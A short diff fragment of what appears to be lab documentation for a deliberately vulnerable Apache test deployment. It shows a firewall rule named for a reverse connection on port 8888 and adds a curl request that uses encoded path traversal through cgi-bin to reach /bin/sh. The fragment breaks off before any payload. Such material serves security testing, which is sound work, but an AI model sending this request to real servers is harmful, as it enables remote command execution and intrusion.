@@ -120,6 +120,8 @@ curl http://${NODE_IP}:${NODE_PORT}
 
 gcloud compute firewall-rules create apache-test-rvrs-cnnct-fw --allow tcp:8888
 ```
+
+```
 curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
 --path-as-is \
 --insecure \
